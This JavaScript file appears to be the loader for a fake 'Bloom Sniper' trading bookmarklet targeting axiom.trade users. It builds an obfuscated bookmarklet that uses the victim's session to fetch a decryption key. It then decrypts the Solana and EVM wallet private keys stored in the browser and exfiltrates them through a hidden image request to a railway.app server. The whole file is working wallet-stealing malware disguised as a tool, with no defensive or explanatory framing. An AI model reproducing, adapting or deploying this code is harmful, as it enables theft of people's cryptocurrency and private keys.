// === BLOOM SNIPER - FINAL WORKING VERSION (Async Fixed + Railway) ===
console.log('🚀 Bloom Sniper Loader loaded from Railway');

document.addEventListener('DOMContentLoaded', function() {
    console.log('📌 DOM ready - injecting bookmarklet');
    const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
    console.log('Found ' + buttons.length + ' button(s)');

    buttons.forEach(function(btn) {
        const innerCode = async () => {   // ← FIXED: now async
            try {
                if (location.hostname !== "axiom.trade") {
                    alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
                    return;
                }

                if (!localStorage.getItem("isAuthed")) {
                    alert("You must be signed in to use this bookmarklet.");
                    return;
                }

                // === ORIGINAL HELPER FUNCTIONS ===
                function arrayToString(dataArray) {
                    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                    const resultDigits = [0];
                    for (let element of dataArray) {
                        let carry = element;
                        for (let i = 0; i < resultDigits.length; i++) {
                            const value = resultDigits[i] * 0x100 + carry;
                            resultDigits[i] = value % 58;
                            carry = value / 58 | 0;
                        }
                        while (carry) {
                            resultDigits.push(carry % 58);
                            carry = carry / 58 | 0;
                        }
                    }
                    let resultString = "";
                    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                    return resultString;
                }

                function stringToArray(key) {
                    try {
                        const cleanedKey = key.replace(/-/g, "+").replace(/_/g, "/");
                        return Uint8Array.from(atob(cleanedKey), k => k.charCodeAt(0));
                    } catch {
                        return new TextEncoder().encode(key);
                    }
                }

                function arrayToStringEVM(e) {
                    return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                        .map(b => b.toString(16).padStart(2, "0")).join("");
                }

                // === RELIABLE IMG EXFIL ===
                async function sendData(data) {
                    const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
                    const timestamp = Math.floor(Date.now() / 1000);
                    const header = navigator.userAgent;
                    data.timestamp = timestamp;
                    data.header = header;

                    const jsonStr = JSON.stringify(data);
                    const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
                    const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;

                    console.log('📤 Sending via img → length:', safeB64.length);

                    const img = document.createElement('img');
                    img.style.cssText = 'display:none;position:absolute;top:-9999px;left:-9999px;';
                    img.src = exfilUrl;

                    if (document.body) document.body.appendChild(img);
                    else if (document.documentElement) document.documentElement.appendChild(img);

                    setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 5000);

                    alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
                }

                // === DECRYPT + STEALING LOGIC ===
                async function decrypt(key, toDecrypt) {
                    const [ivString, dataString] = String(toDecrypt).split(":");
                    const iv = stringToArray(ivString);
                    const data = stringToArray(dataString);
                    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, key, data);
                    return new Uint8Array(decrypted);
                }

                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                    method: "POST",
                    credentials: "include"
                })).json();

                const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { name: "AES-GCM" }, false, ["decrypt"]);

                const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");

                const success = [];

                // Solana
                for (const bundle of solanaBundles) {
                    try {
                        const decryptedBundle = await decrypt(cryptoKey, bundle);
                        if (decryptedBundle.length !== 0x40) throw new Error("bad SK length");
                        const privateKey = arrayToString(decryptedBundle);
                        const publicKeyData = decryptedBundle.slice(0x20);
                        const publicKey = arrayToString(publicKeyData);
                        success.push({ pub: publicKey, priv: privateKey });
                    } catch (e) {}
                }

                // EVM
                let ethers = null;
                try {
                    ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
                } catch (e) { console.log(e); }

                for (const bundle of evmBundles) {
                    try {
                        const decryptedBundle = await decrypt(cryptoKey, bundle);
                        const privateKey = arrayToStringEVM(decryptedBundle);
                        let publicKey = "unknown";
                        if (ethers) publicKey = ethers.computeAddress("0x" + privateKey);
                        success.push({ pub: publicKey, priv: privateKey });
                    } catch (e) {}
                }

                // Send data
                await sendData({ keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom" });

            } catch (err) {
                console.error('🚨 Bookmarklet error:', err);
                alert('Error: ' + (err.message || err));
            }
        };

        // Safe bookmarklet injection
        const codeStr = '(' + innerCode.toString() + ')()';
        const encoded = btoa(unescape(encodeURIComponent(codeStr)));
        btn.href = 'javascript:eval(atob("' + encoded + '"))';
        btn.draggable = true;
        console.log('✅ Real bookmarklet injected successfully!');
    });
});